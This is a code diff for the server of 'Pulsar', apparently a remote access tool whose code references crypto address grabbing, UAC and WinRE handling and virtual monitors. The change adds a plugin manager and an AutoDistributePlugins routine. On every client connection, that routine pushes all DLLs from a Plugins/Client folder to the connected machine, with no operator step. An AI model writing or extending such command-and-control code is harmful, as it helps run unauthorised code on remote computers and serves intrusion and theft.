@@ -29,6 +29,8 @@ using Pulsar.Common.Messages.Monitoring.VirtualMonitor;
 
 using Pulsar.Common.Messages.ClientManagement.UAC;
 using Pulsar.Common.Messages.ClientManagement.WinRE;
+using Pulsar.Server.Plugin;
+using Pulsar.Common.Messages.Plugin;
 
 namespace Pulsar.Server.Forms
 {
@@ -48,15 +50,16 @@ namespace Pulsar.Server.Forms
         private readonly ClientDebugLog _clientDebugLogHandler;
         private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
         private readonly object _processingClientConnectionsLock = new object();
-        private readonly object _lockClients = new object();
+        private readonly object _lockClients = new object();        
         private PreviewHandler _previewImageHandler;
         private readonly string AutoTasksFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "autotasks.json");
-
+        private readonly ServerPluginManager _serverPluginManager;        
         public FrmMain()
         {
             _clientStatusHandler = new ClientStatusHandler();
             _getCryptoAddressHander = new GetCryptoAddressHandler();
             _clientDebugLogHandler = new ClientDebugLog();
+            _serverPluginManager = new ServerPluginManager();
             RegisterMessageHandler();
             InitializeComponent();
             typeof(ListView).InvokeMember("DoubleBuffered",
@@ -68,6 +71,9 @@ namespace Pulsar.Server.Forms
             _discordRpc.Enabled = Settings.DiscordRPC;     // Sync with settings on startup
 
             tableLayoutPanel1.VisibleChanged += TableLayoutPanel1_VisibleChanged;
+            
+            // Load plugins on startup
+            LoadPluginsOnStartup();
         }
 
         private void OnAddressReceived(object sender, Client client, string addressType)
@@ -488,6 +494,8 @@ namespace Pulsar.Server.Forms
                     }
                 }
                 UpdateConnectedClientsCount();
+                
+                AutoDistributePlugins(client);
             }
         }
 
@@ -551,6 +559,7 @@ namespace Pulsar.Server.Forms
                         case true:
                             AddClientToListview(client.Key);
                             StartAutomatedTask(client.Key);
+                            AutoDistributePlugins(client.Key);
                             if (Settings.ShowPopup)
                                 ShowPopup(client.Key);
                             break;
@@ -1066,6 +1075,79 @@ namespace Pulsar.Server.Forms
             }
             catch (InvalidOperationException)
             {
+            }
+        }
+
+        /// <summary>
+        /// Loads server plugins from the Plugins/Server directory on startup.
+        /// </summary>
+        private void LoadPluginsOnStartup()
+        {
+            try
+            {
+                _serverPluginManager.LoadPluginsFromDirectory();
+                var loadedPlugins = _serverPluginManager.GetLoadedPlugins();
+                EventLog($"Loaded {loadedPlugins.Count()} server plugins on startup", "info");
+                
+                foreach (var pluginName in loadedPlugins)
+                {
+                    EventLog($"  - Server plugin loaded: {pluginName}", "info");
+                }
+            }
+            catch (Exception ex)
+            {
+                EventLog($"Error loading plugins on startup: {ex.Message}", "error");
+            }
+        }
+
+        /// <summary>
+        /// Automatically distributes all available client plugins to a newly connected client.
+        /// </summary>
+        /// <param name="client">The client to distribute plugins to.</param>
+        private void AutoDistributePlugins(Client client)
+        {
+            try
+            {
+                var pluginDirectory = Path.Combine(Environment.CurrentDirectory, "Plugins", "Client");
+                if (!Directory.Exists(pluginDirectory))
+                {
+                    return;
+                }
+
+                var clientPluginFiles = Directory.GetFiles(pluginDirectory, "*.dll");
+                var distributedCount = 0;
+
+                foreach (var pluginFile in clientPluginFiles)
+                {
+                    try
+                    {
+                        var pluginName = Path.GetFileNameWithoutExtension(pluginFile);
+                        var pluginBytes = _serverPluginManager.GetClientPluginBytes(pluginName);
+                        
+                        if (pluginBytes != null)
+                        {
+                            client.Send(new DoPluginDistribution
+                            {
+                                PluginName = pluginName,
+                                PluginContent = pluginBytes
+                            });
+                            distributedCount++;
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        EventLog($"Error distributing plugin {Path.GetFileNameWithoutExtension(pluginFile)}: {ex.Message}", "error");
+                    }
+                }
+
+                if (distributedCount > 0)
+                {
+                    EventLog($"Auto-distributed {distributedCount} client plugins to {client.Value?.Username ?? "Unknown"} ({client.EndPoint.Address})", "info");
+                }
+            }
+            catch (Exception ex)
+            {
+                EventLog($"Error in auto-distribution: {ex.Message}", "error");
             }
         }
 
